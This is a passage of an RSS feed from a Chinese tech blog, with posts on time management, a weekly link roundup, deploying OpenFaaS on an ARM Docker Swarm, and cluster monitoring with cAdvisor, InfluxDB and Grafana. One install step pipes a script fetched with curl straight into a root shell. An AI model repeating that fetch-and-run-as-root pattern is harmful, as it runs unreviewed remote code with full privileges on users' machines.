，显然这个是非常难以实现的。不知不觉看看表，就过了几个小时。</p><p>我们得想想：<strong>啊，现在我们做的事情有多么多么的好处</strong> 从而让自己对事件的流逝感觉惋惜。</p><blockquote><p>原则是：开始做：”只做一分钟“的事情前先设好警报</p></blockquote><h2 id="说明文件"><a href="#说明文件" class="headerlink" title="说明文件"></a>说明文件</h2><p>多多的写 Wiki ，便于项目的记载和管理。</p><h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>make其实不仅仅用在编译，而也可以是小项目的管理，书中提到的自动化的流程，使用脚本等等，现在已经成为常规。</p><h2 id="段子"><a href="#段子" class="headerlink" title="段子"></a>段子</h2><blockquote><p>RAID 原来指的是 ”Redundant Arrays of Inexpensive Disk“ 廉价磁盘冗余阵列。现在就是 Independent</p></blockquote><h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><ul><li>每周40小时就回家（我也想啊）</li><li>多点事件和挚友相处</li><li>多陪陪你的小孩</li><li>打给你的父母和生活中其他重要的人士。</li></ul><hr>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/22/OP_Time_manage/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Weekly.0</title>
      <link>https://www.diglp.xyz/2019/03/22/Weekly_0/</link>
      <guid>https://www.diglp.xyz/2019/03/22/Weekly_0/</guid>
      <pubDate>Thu, 21 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>总会遇见一些奇奇怪怪但是给自己带来一些新奇的想法的东西。有时候给偷偷转发，或者自己收藏。</p><p>但是，很遗憾的是总是没有进行统一的管理。 一会丢了，一会不见了。突然想到的时候，找啊找，总是找不到它了。</p><p>所以，决定再在这里开坑吧，每周一更，时间佛系。也算是对自己的监督了。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h3><ul><li><p>是不是每个人年轻的时候都有这样一段日子，鸿鹄志高却难遂，迷茫地过着，昏昏噩噩地耗，最终不是妥协泯然众人，就是找不到出口被生活围困。这时候家人朋友，看在眼里，哪怕不说，心里想的也是“小镇青年何必心怀远方”这样的想法吧。（J·M·库切《青春》）</p></li><li><p>当发现自己的才会撑不起野心的时候，就安静下来学习吧。</p></li><li><p>使用人月作为一项工程的规模，是一个危险和带有欺骗性的神话。（佛瑞德·布鲁克斯《人月神话》）</p></li><li><p>卡辛斯基曾经提到过这种情况。未来生产力大发展，物质极大丰富，人类无所事事，只能”把时间花在互相擦皮鞋上面，或者用出租车带着彼此到处瞎转，互相为对方做手工艺品，互相给对方端盘子等等。”说实话，我看不出来，大家互相拍视频，直播吃饭、购物、打游戏，跟互相擦皮鞋，有什么本质的不同。</p><p>（对未来AI带来的生产力解放的一个猜想）</p></li></ul><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VjaHVhbmcub3JnL3QvNjIzMjU=" title="https://www.kechuang.org/t/62325">化工男的十二年的化学遭遇之路<i class="fa fa-external-link"></i></span>     真真实实的好文章<ul><li>保证不伤害自己，保证不伤害他人，保证自己不被他人伤害</li></ul></li><li><span class="exturl" data-url="aHR0cDovL3d3dy55ZWxvb2suY29tLzIyNjEuaHRtbA==" title="http://www.yelook.com/2261.html">世界上只有一种病，那就是穷病<i class="fa fa-external-link"></i></span>     穷，大概是我现在最害怕的一个东西<ul><li>一个得了穷病的人，永远着眼于眼前的资源，惧怕风险，不舍得投入，做事畏首畏脚，注定不会有大的成就。道理一套一套的摆在那边，但是真正的让自己去行动，确实难上加难，否则我也不会有昨天那般狼狈不堪了。真的需要痛定思痛的去改变自己了。</li></ul></li></ul><h3 id="TECH"><a href="#TECH" class="headerlink" title="TECH"></a>TECH</h3><ol><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudjJleC5jb20vdC8yNjc2NDEjcmVwbHk3" title="https://www.v2ex.com/t/267641#reply7">什么是 Docker – V2EX<i class="fa fa-external-link"></i></span><ol><li><strong>Docker不是虚拟机</strong>，所形容的集装箱，更多的指的是应用的标准。这也就是一个容器一个进程的最好的解释。</li><li>那么 Docker 的实质是什么？在我看来就是个针对 PAAS 平台的自动化运维工具而已。众所周知（当然如果你不知道，那么我来告诉你）：自动化运维的大前提就是标准化。</li><li>当你开始诟病Docker的变更需要提交太麻烦的时候，要开始反思自己的需求是否真的需要 Docker了。</li></ol></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudjJleC5jb20vdC8yNzg5MjEjcmVwbHkyMg==" title="https://www.v2ex.com/t/278921#reply22">Linux 内存中的 Cache 真的能被回收么？<i class="fa fa-external-link"></i></span></p><ol><li>buffers/cache 占用的较多，说明系统中有进程曾经读写过文件，但是不要紧，这部分内存是当空闲来用的</li></ol></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua3ViZXJuZXRlcy5vcmcuY24vNTAzNi5odG1s" title="https://www.kubernetes.org.cn/5036.html">Kubernetes实战 – 谈谈微博应对春晚等突发峰值流量的经验<i class="fa fa-external-link"></i></span></li><li><p><span class="exturl" data-url="aHR0cDovL2xpYW9waC5jb20vaG93LWNvbXB1dGVycy1ib290LXVwLw==" title="http://liaoph.com/how-computers-boot-up/">计算机原理 —— 计算机是如何启动的<i class="fa fa-external-link"></i></span></p><ol><li>硬件初始化 =&gt; 加载BIOS =&gt; 加载Loader(win/Linux Loader) =&gt; （Stage2 加载）=&gt; 加载内核代码</li></ol></li><li><p><span class="exturl" data-url="aHR0cDovL2xpYW9waC5jb20vbW90aGVyYm9hcmQtYW5kLW1lbW9yeS1tYXAv" title="http://liaoph.com/motherboard-and-memory-map/">计算机原理 —— 主板与内存映射<i class="fa fa-external-link"></i></span></p><ol><li>不是所有的地址都会被进行内存寻址，会在北桥进行地址转换，到一些IO设备。</li></ol></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1hbGx1eC5tZS8yMDE3LzAyLzA4L2V0Y2Qv" title="https://blog.mallux.me/2017/02/08/etcd/">Etcd 分布式配置共享<i class="fa fa-external-link"></i></span> <ol><li>从本质上说，<code>分布式配置共享服务就是一种分布式的键值数据库</code>。</li><li>Etcd 主要注重于应用配置数据的保存，它能够确保数据在多个节点上的高度一致性，并在集群半数以下成员节点出现故障时，继续保持正常运转</li><li>用来做主机的配置的统一管理</li></ol></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1hbGx1eC5tZS8yMDE3LzAyLzAzL2RvY2tlci1vcmNoZXN0cmF0aW5nLw==" title="https://blog.mallux.me/2017/02/03/docker-orchestrating/">Docker 三剑客<i class="fa fa-external-link"></i></span></p><ol><li><p>Docker Compose</p><ol><li><p>Docker 的最佳实践是一个容器只运行一个进程，因此要运行多个组件则必须运行多个容器。在一个由多容器构成的应用里，我们需要一个有效的工具来定义一个应用由哪些容器组成，以及定义这些容器之间如何关联。为了解决以上问题，Compose 便应运而生。</p></li><li><p>从本质上来讲，Compose 把 YML 文件解析成 docker 命令的参数，然后调用相应的 docker 命令行接口，从而把应用以容器化的方式管理起来</p></li></ol></li><li><p>Docker Swarm</p><ol><li><p>它可以把多个 Docker 主机组成的系统转换成为单一的虚拟 Docker 主机。</p></li><li><p>一个服务由多个任务组成，一个任务即一个运行的容器。</p></li><li><p>The swarm manager uses <code>ingress load balancing ( 基于 ipvs 的四层代理 )</code> to expose the services you want to make available externally to the swarm。使用四层负载均衡实现可用性拓展</p></li><li><p>Docker Swarm（With an external key-value store）推荐使用 <code>etcd</code> 进行统一管理</p><ol><li>官方不推荐基于 token 的 Docker Swarm 来创建 Swarm 集群（仅适用于开发测试环境），而应该基于 KV 键值配置共享来实现 Swarm 集群。</li><li>使用 docker-machine + etcd 的方式来直接创建 swarm 集群，etcd 使用单台主机（clean-Host）提供服务。</li><li><code>swarm manager</code> 和 <code>swarm agent</code> 的创建，只要指定 discovery 服务为 Etcd 等配置共享服务即可。例如：<code>--swarm-discovery etcd://172.16.0.21:2379</code>。</li></ol></li></ol></li><li><p>Docker Machine</p><ol><li>一个 Docker Machine 就是一个 Docker host 主机和经过配置的 Docker client 的结合体。</li><li>方便的进行跨主机的多Docker 的服务管理</li></ol></li></ol></li><li><span class="exturl" data-url="aHR0cDovL2xpYW9waC5jb20vbHZzLw==" title="http://liaoph.com/lvs/">负载均衡集群 LVS 详解<i class="fa fa-external-link"></i></span><ol><li>垂直拓展/水平拓展 = 高性能/多数量</li><li>四层负载均衡：根据请求报文中的目标地址和端口进行调度</li><li>七层负载均衡：根据请求报文的内容进行调度，这种调度属于「代理」的方式</li></ol></li></ol><h3 id="PickS"><a href="#PickS" class="headerlink" title="PickS"></a>PickS</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubm90aW9uLnNvLw==" title="https://www.notion.so/">Notion<i class="fa fa-external-link"></i></span> - 好像是一款很好用的全功能的笔记工具</li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>后面自己专注收集吧，也希望成为每周的 Tab-Closing 计划。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/22/Weekly_0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>OpenFaaS 的部署</title>
      <link>https://www.diglp.xyz/2019/03/19/OP_OpenFaaS/</link>
      <guid>https://www.diglp.xyz/2019/03/19/OP_OpenFaaS/</guid>
      <pubDate>Mon, 18 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;## &lt;/p&gt;
&lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;本来说项目完结的转身离去，不过这样的一个平台带来的
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>## </p><h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>本来说项目完结的转身离去，不过这样的一个平台带来的 <strong>从未体验过的全新感觉</strong> 实在是震惊呢。这一片再开新坑，来部署一个 <strong>serverless</strong> 思想的 OpenFaaS平台</p><blockquote><p>FaaS = Function as a Service</p></blockquote><p>这篇操作主要参考文章：</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmFsZXhlbGxpcy5pby95b3VyLXNlcnZlcmxlc3MtcmFzcGJlcnJ5LXBpLWNsdXN0ZXIv" title="https://blog.alexellis.io/your-serverless-raspberry-pi-cluster/">Your Serverless Raspberry Pi cluster with Docker<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTkwMDctMS5odG1s" title="https://linux.cn/article-9007-1.html">使用 Docker 构建你的 Serverless 树莓派集群<i class="fa fa-external-link"></i></span>（上文译版）</li><li><span class="exturl" data-url="aHR0cHM6Ly9qaW1teXNvbmcuaW8vcG9zdHMvb3BlbmZhYXMtcXVpY2stc3RhcnQv" title="https://jimmysong.io/posts/openfaas-quick-start/">OpenFaaS快速入门指南<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qaW1teXNvbmcuaW8vcG9zdHMvd2hhdC1pcy1zZXJ2ZXJsZXNzLw==" title="https://jimmysong.io/posts/what-is-serverless/">什么是Serverless（无服务器）架构？<i class="fa fa-external-link"></i></span></li></ul></blockquote><p>部署过程使用一键安装脚本，感觉有点点惭愧，不过体验功能才是重点。不重复造轮子问题不大。这篇打算主要写，这个 OpenFaaS 的架构的组成，以及后面的基础使用。</p><h2 id="关于-OpenFaaS"><a href="#关于-OpenFaaS" class="headerlink" title="关于 OpenFaaS"></a>关于 OpenFaaS</h2><h3 id="什么是OpenFaaS"><a href="#什么是OpenFaaS" class="headerlink" title="什么是OpenFaaS"></a>什么是OpenFaaS</h3><p>和我们熟知的 <strong>IaaS，PaaS，SaaS</strong> 类似，这里指的是云的三大层次。如果不是很清楚可以看这个 ：</p><blockquote><ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTcvMDcvaWFhcy1wYWFzLXNhYXMuaHRtbA==" title="http://www.ruanyifeng.com/blog/2017/07/iaas-paas-saas.html">IaaS，PaaS，SaaS 的区别 - ruanyf<i class="fa fa-external-link"></i></span></li></ul><p>今天大多数公司在开发应用程序并将其部署在服务器上的时候，无论是选择公有云还是私有的数据中心，都需要提前了解究竟需要多少台服务器、多大容量的存储和数据库的功能等。并需要部署运行应用程序和依赖的软件到基础设施之上。假设我们不想在这些细节上花费精力，是否有一种简单的架构模型能够满足我们这种想法？</p></blockquote><p>函数及服务，在这里是Serverless的一种实现，这里的 Serverless 可以简单的理解为，服务器的服务应用都被<strong>打包成了一个个独立的容器</strong>。这种情况下可以很容易的进行全自动的横向扩容。</p><blockquote><p>传统的服务器端软件不同是经应用程序部署到拥有操作系统的虚拟机或者容器中，一般需要长时间驻留在操作系统中运行，而FaaS是直接将程序部署上到平台上即可，当有事件到来时触发执行，执行完了就可以卸载掉。</p></blockquote><hr><p>就可以使用 类似于 <code>http://bgb0:8080/function/nslookup</code> 这样的URL来对容器服务产生一个请求，而不用再考虑后端的各种的体系和流程。</p><h2 id="OpenFaaS部署"><a href="#OpenFaaS部署" class="headerlink" title="OpenFaaS部署"></a>OpenFaaS部署</h2><h3 id="FaaS-服务部署"><a href="#FaaS-服务部署" class="headerlink" title="FaaS 服务部署"></a>FaaS 服务部署</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这里使用现有的项目一键部署</span></span><br><span class="line">git clone https://github.com/alexellis/faas/</span><br><span class="line">cd faas</span><br><span class="line">./deploy_stack.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 客户端安装 fssa-cli 用于构建</span></span><br><span class="line">curl -sSL cli.openfaas.com | sudo sh</span><br></pre></td></tr></table></figure><p>对于 OpenFaaS 的部署，上面有给出的一键部署的的脚本，在x86和Arm上都可以进行快速的部署。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@vm0:~# docker stack services func</span><br><span class="line">ID                  NAME                MODE                REPLICAS            IMAGE                                 PORTS</span><br><span class="line">joj44r8vpaf4        func_faas-swarm     replicated          1/1                 openfaas/faas-swarm:0.6.1-armhf       </span><br><span class="line">mjnrabl3d8sj        func_nats           replicated          1/1                 nats-streaming:0.11.2                 </span><br><span class="line">mo8klvy4id9n        func_queue-worker   replicated          1/1                 openfaas/queue-worker:0.6.0-armhf     </span><br><span class="line">phqan7977dgi        func_alertmanager   replicated          1/1                 functions/alertmanager:0.15.0-armhf   </span><br><span class="line">sjbxputi1xe8        func_prometheus     replicated          1/1                 functions/prometheus:2.7.0-armhf      *:9090-&gt;9090/tcp</span><br><span class="line">z6pc60t4b684        func_gateway        replicated          1/1                 openfaas/gateway:0.11.0-armhf         *:8080-&gt;8080/tcp</span><br></pre></td></tr></table></figure><p>在部署完成之后，可以看到有这些服务组成了这个 Stack</p><ul><li>func_gateway    管理 Function 的前端页面</li><li>func_prometheus    数据统计，以及告警的平台，用于检测服务状态来来实现系统扩容。</li></ul><h3 id="Grafana-监控部署"><a href="#Grafana-监控部署" class="headerlink" title="Grafana 监控部署"></a>Grafana 监控部署</h3><p>这里使用了prometheus作为数据收集和数据源和Grafana很好的兼容。直接可以作为Dashboard 的数据源。这里已经有了 FaaS 的模板的Json配置文件：</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ncmFmYW5hLmNvbS9kYXNoYm9hcmRzLzM1MjY=" title="https://grafana.com/dashboards/3526">https://grafana.com/dashboards/3526<i class="fa fa-external-link"></i></span></li></ul></blockquote><p>在对Dashboard导入后，有统计调用频率，函数副本数，调用次数，调用比例。</p><h2 id="OpenFaaS-HelloWorld"><a href="#OpenFaaS-HelloWorld" class="headerlink" title="OpenFaaS.HelloWorld()"></a>OpenFaaS.HelloWorld()</h2><p>由于是 ARM 的平台，所以导致可以直接拿来使用的镜像不是很多。其自带的 <strong>nodeinfo</strong> 和 <strong>nslookup</strong> 。这里如果要实现一个hello world 需要自己去构建函数镜像。直接使用 <code>faas-cli</code> 先生成模板。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faas-cli new --lang python hello-python</span><br></pre></td></tr></table></figure><p>然后回自动的构建一个python 的函数容器的模板：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@bgb0:~/functions# tree . -L 2</span><br><span class="line">.</span><br><span class="line">|-- hello-python</span><br><span class="line">|   |-- handler.py# 修改</span><br><span class="line">|   `-- requirements.txt</span><br><span class="line">|-- hello-python.yml# 修改</span><br><span class="line">|-- pass</span><br><span class="line">`-- template</span><br><span class="line">    |-- csharp</span><br><span class="line">    |-- csharp-armhf</span><br><span class="line">    |-- dockerfile</span><br><span class="line">    |-- go</span><br><span class="line">    |-- go-armhf</span><br><span class="line">    |-- java8</span><br><span class="line">    |-- node</span><br><span class="line">    |-- node-arm64</span><br><span class="line">    |-- node-armhf</span><br><span class="line">    |-- php7</span><br><span class="line">    |-- python</span><br><span class="line">    |-- python-armhf# 拷贝到上级</span><br><span class="line">    |-- python3</span><br><span class="line">    |-- python3-armhf</span><br><span class="line">    `-- ruby</span><br></pre></td></tr></table></figure><p>然后开始写接口，这里直接编辑 <code>handler.py</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(req)</span>:</span></span><br><span class="line">    <span class="string">"""handle a request to the function</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        req (str): request body</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(<span class="string">"Hello! This is a test: "</span> + req)</span><br><span class="line">    <span class="keyword">return</span> req</span><br></pre></td></tr></table></figure><p>修改之后，执行构建命令，有二十几个step。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faas-cli build -f ./hello-python.yml</span><br></pre></td></tr></table></figure><blockquote><p>If you’re trying thing out on a single host, then you don’t need to push your images to a registry, they’ll just be used from the local Docker library.</p></blockquote><p>为了让其他的容器拉到镜像，这里需要 push 镜像上去。</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>今天变成 <code>高盐度低湿度常见水产品</code></p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/19/OP_OpenFaaS/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Docker的集群监控</title>
      <link>https://www.diglp.xyz/2019/03/17/OP_Cluster_Monitor/</link>
      <guid>https://www.diglp.xyz/2019/03/17/OP_Cluster_Monitor/</guid>
      <pubDate>Sat, 16 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;再一次被 Docker 所带来的革命性的变量所震撼。&lt;strong&gt;Build，ship and
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>再一次被 Docker 所带来的革命性的变量所震撼。<strong>Build，ship and run</strong>。</p><p>想着给之前的搭建的集群加一个监控系统，主机性能监控，和服务日志监控(ES + Kibana + filebeat)。当然很有可能只是幻想了。因为单机性能实在是太过羸弱。 </p><p>正巧看到了网上的方案使用的是 ：</p><blockquote><p>cAdvisor(数据收集)+InfluxDB(数据存储)+Grafana(数据可视化)</p></blockquote><p>这样的方案。这里的主要参考文章链接：</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvdGxlZy9zd2FybS1tb25pdG9yaW5n" title="https://github.com/botleg/swarm-monitoring">Docker Swarm Monitoring<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RrZmFqc2xkZnNkZnNkL2FydGljbGUvZGV0YWlscy83OTk3NzY5Mw==" title="https://blog.csdn.net/dkfajsldfsdfsd/article/details/79977693">docker swarm集群监控方案cAdvisor+InfluxDB+Grafana实战<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="服务部署"><a href="#服务部署" class="headerlink" title="服务部署"></a>服务部署</h2><p>有了前面的折腾的经验，这里就到了一路绿灯的状态了。毕竟较之前有了更多的理解。这里直接使用 compose 进行结构化的部署：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.2'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  influx:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">influxdb</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">      - influx:</span><span class="string">/var/lib/influxdb</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">      placement:</span></span><br><span class="line"><span class="attr">        constraints:</span></span><br><span class="line">        <span class="comment"># 这里指定部署的角色，数据库放在manager上面</span></span><br><span class="line"><span class="bullet">          -</span> <span class="string">node.role</span> <span class="string">==</span> <span class="string">manager</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">  grafana:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">grafana/grafana</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line">    <span class="comment"># 端口映射</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:3000:3000</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">      - grafana:</span><span class="string">/var/lib/grafana</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">influx</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">      placement:</span></span><br><span class="line"><span class="attr">        constraints:</span></span><br><span class="line">        <span class="comment"># 这里也是指定部署角色</span></span><br><span class="line"><span class="bullet">          -</span> <span class="string">node.role</span> <span class="string">==</span> <span class="string">manager</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">  cadvisor:</span></span><br><span class="line">  <span class="comment"># 这里需要使用 cadvisor 的ARM 的版本</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">budry/cadvisor-arm</span></span><br><span class="line">    <span class="comment"># 这里指定hostname 为节点名</span></span><br><span class="line"><span class="attr">    hostname:</span> <span class="string">'<span class="template-variable">&#123;&#123;.Node.Hostname&#125;&#125;</span>'</span></span><br><span class="line">    <span class="comment"># 配置参数（待会前面的frp可以学习一下）</span></span><br><span class="line"><span class="attr">    command:</span> <span class="bullet">-logtostderr</span> <span class="bullet">-docker_only</span> <span class="bullet">-storage_driver=influxdb</span> <span class="bullet">-storage_driver_db=cadvisor</span> <span class="bullet">-storage_driver_host=influx:8086</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line">    <span class="comment"># 这里需要对一些目录进行挂载，特别是 sys 以便获得系统信息</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/:/rootfs:ro</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/var/run:/var/run:rw</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/sys:/sys:ro</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/var/lib/docker/:/var/lib/docker:ro</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">influx</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      mode:</span> <span class="string">global</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="attr">  influx:</span></span><br><span class="line"><span class="attr">    driver:</span> <span class="string">local</span></span><br><span class="line"><span class="attr">  grafana:</span></span><br><span class="line"><span class="attr">    driver:</span> <span class="string">local</span></span><br></pre></td></tr></table></figure><p>上传 <code>yml</code> 文件，直接在 manager 节点进行部署：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull braingamer/cadvisor-arm</span><br><span class="line">docker pull grafana/grafana</span><br><span class="line">docker stack deploy -c monitor.yml monitor</span><br></pre></td></tr></table></figure><p>其实 这里会自动的拉镜像。(Docker 在大陆连通性不好)所以这里可能对部分镜像需要梯子。如果不出意外，理应是一路绿灯。</p><hr><p>上面的部署过程完成之后，后面需要在 InfluxDB 里面建立一个 cAdvisor 的库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec `docker ps | grep -i influx | awk '&#123;print $1&#125;'` influx -execute 'CREATE DATABASE cadvisor'</span><br></pre></td></tr></table></figure><p>容器内执行的命令。cAdviosr 的配置已经在部署的yml指定：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="bullet">-logtostderr</span> <span class="bullet">-docker_only</span> <span class="bullet">-storage_driver=influxdb</span> <span class="bullet">-storage_driver_db=cadvisor</span> <span class="bullet">-storage_driver_host=influx:8086</span></span><br></pre></td></tr></table></figure><p>后面就是在 Grafana 里面对视图进行配置了，（默认账号密码：admin），在项目里面有示例的 dashboard的配置，这里直接 Copy-paste 就好</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvdGxlZy9zd2FybS1tb25pdG9yaW5n" title="https://github.com/botleg/swarm-monitoring">swarm-monitoring<i class="fa fa-external-link"></i></span>/<strong><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JvdGxlZy9zd2FybS1tb25pdG9yaW5nL2Jsb2IvbWFzdGVyL2Rhc2hib2FyZC5qc29u" title="https://github.com/botleg/swarm-monitoring/blob/master/dashboard.json">dashboard.json<i class="fa fa-external-link"></i></span></strong></li></ul></blockquote><hr><p>这里有个坑，需要修改这个配置文件里面的数据源。由 <code>influx</code> 改为 <code>InfluxDB</code>。</p><hr><p>这里的数据源直接可以修改为 <code>http://influx:8086</code> 便可以直接进行连接。</p><p>至此配置完成，直接访问 主机的3000 端口即可，看见高大上的 Grafana的界面了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@vm0:~# docker service ls</span><br><span class="line">ID                  NAME                MODE                REPLICAS            IMAGE                        PORTS</span><br><span class="line">0m4tl8b6huw9        monitor_cadvisor    global              5/5                 budry/cadvisor-arm:latest    </span><br><span class="line">ixftiydc1v8k        monitor_grafana   